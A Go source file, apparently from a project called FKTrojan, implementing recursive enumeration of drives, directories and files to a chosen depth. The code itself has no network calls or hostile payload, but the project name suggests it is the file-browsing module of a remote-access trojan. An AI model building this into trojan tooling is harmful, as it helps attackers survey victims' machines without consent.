package main

import (
	. "FKTrojan/common"
	"fmt"
	"io/ioutil"
	"os"
	"path"
	"path/filepath"
)

func Exist(path string) bool {
	_, err := os.Stat(path)
	if os.IsNotExist(err) {
		return false
	}
	return true
}
func Scan(dir string, depth uint) ([]Item, error) {
	if dir == "/" || dir == "\\\\" {
		drives := GetLogicalDrives()
		items := make([]Item, 0)
		for _, drive := range drives {
			items = append(items, Item{
				drive,
				DIR_ITEM})
		}
		return items, nil
	}
	if !Exist(dir) {
		return nil, fmt.Errorf("%s not exist", dir)
	}
	stat, _ := os.Stat(dir)
	if !stat.IsDir() {
		return nil, fmt.Errorf("%s is not dir", dir)
	}
	items := make([]Item, 0)
	// 如果0级，返回自己
	if depth == 0 {
		items = append(items, Item{dir, DIR_ITEM})
		return items, nil
	}
	// just current dir
	files, _ := ioutil.ReadDir(dir)
	for _, fi := range files {

		itemType := FILE_ITEM
		if fi.IsDir() {
			itemType = DIR_ITEM
		}
		itemName := path.Clean(filepath.ToSlash(dir + string(os.PathSeparator) + fi.Name()))
		items = append(items, Item{
			itemName,
			itemType})
		// 只获取当前目录file和dir
		if depth == 1 {
			continue
		}
		subDepth := depth
		if depth == DEPTH_ALL {
			// 获取所有子项
			subDepth = DEPTH_ALL
		} else {
			// 获取指定深度项
			subDepth = depth - 1
		}
		if fi.IsDir() {
			subItems, err := Scan(itemName, subDepth)
			if err != nil {
				return nil, err
			}
			items = append(items, subItems...)
		}
	}
	return items, nil
}
